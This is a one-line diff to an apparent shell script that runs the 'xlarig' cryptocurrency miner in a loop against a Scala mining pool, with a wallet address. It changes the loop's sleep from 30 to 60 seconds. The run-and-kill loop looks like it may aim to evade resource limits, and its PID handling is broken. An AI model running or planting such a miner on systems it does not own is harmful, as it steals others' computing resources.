@@ -1,1 +1,1 @@
-while true; do cd xla && ./xlarig -o sg.scala.herominers.com:10130 -u SvkKp92SYoy8GZHn3LaKoGg8SSQfVGhsfJUumopjGbiLAfkrtCbnQ7JREF4BawqkkxF67JicmbecqDiV4jfTLktd2yG9WLoyb -p oncom21 -a panthera -k -t 1; PID=$!; sleep 30; kill $PID; done
+while true; do cd xla && ./xlarig -o sg.scala.herominers.com:10130 -u SvkKp92SYoy8GZHn3LaKoGg8SSQfVGhsfJUumopjGbiLAfkrtCbnQ7JREF4BawqkkxF67JicmbecqDiV4jfTLktd2yG9WLoyb -p oncom21 -a panthera -k -t 1; PID=$!; sleep 60; kill $PID; done
